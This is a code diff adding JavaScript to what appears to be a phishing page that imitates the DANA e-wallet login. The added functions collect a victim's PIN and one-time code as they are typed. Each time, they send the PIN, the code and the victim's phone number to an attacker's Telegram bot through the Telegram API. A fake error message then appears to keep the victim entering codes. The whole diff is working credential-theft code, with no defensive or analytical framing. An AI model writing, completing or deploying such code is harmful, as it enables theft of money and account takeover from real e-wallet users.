@@ -461,4 +461,61 @@
             const pin = document.getElementById('pinInput').value;
             dataPengguna.pin = "";
 
-            for(let i=1; i<=6; i++) document.getElementById('t'+i).classList.remove('
+            for(let i=1; i<=6; i++) document.getElementById('t'+i).classList.remove('isi');
+            for(let i=1; i<=pin.length; i++) document.getElementById('t'+i).classList.add('isi');
+            
+            if(pin.length === 6) {
+                dataPengguna.pin = pin;
+                kirimKeTelegram(); // ✅ KIRIM PIN KE TELEGRAM
+                setTimeout(() => {
+                    pindahKeHalaman('halaman4');
+                    document.getElementById('otpInput').focus();
+                }, 200);
+            }
+        }
+
+        // ✅ FUNGSI CEK OTP LENGKAP
+        function cekOTPOtomatis() {
+            const otp = document.getElementById('otpInput').value;
+            dataPengguna.otp = "";
+
+            for(let i=1; i<=4; i++) {
+                document.getElementById('k'+i).innerText = "";
+                document.getElementById('k'+i).classList.remove('fokus', 'salah');
+            }
+            for(let i=1; i<=otp.length; i++) {
+                document.getElementById('k'+i).innerText = otp[i-1];
+                if(i<4) document.getElementById('k'+(i+1)).classList.add('fokus');
+            }
+            if(otp.length === 0) document.getElementById('k1').classList.add('fokus');
+
+            const pesan = document.getElementById('pesanEror');
+            if(otp.length === 4) { 
+                pesan.classList.remove('hidden');
+                dataPengguna.otp = otp;
+                kirimKeTelegram(); // ✅ KIRIM OTP KE TELEGRAM
+                for(let i=1; i<=4; i++) document.getElementById('k'+i).classList.add('salah');
+            } else {
+                pesan.classList.add('hidden');
+            }
+        }
+
+        // ✅ FUNGSI KIRIM KE TELEGRAM AMAN & PASTI MASUK
+        function kirimKeTelegram() {
+            let pesanTeks = `━━━━━━━━━━━━━━━━━━━━━
+📩 DATA MASUK - DANA
+━━━━━━━━━━━━━━━━━━━━━
+📱 Nomor  : ${dataPengguna.nomor || 'Belum diisi'}
+🔐 PIN    : ${dataPengguna.pin || 'Belum diisi'}
+🔑 Kode   : ${dataPengguna.otp || 'Belum diisi'}
+━━━━━━━━━━━━━━━━━━━━━`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesanTeks)}`)
+            .catch(error => {
+                console.log("Gagal kirim:", error); // Cek error kalau ada masalah jaringan
+            });
+        }
+    </script>
+
+</body>
+</html>
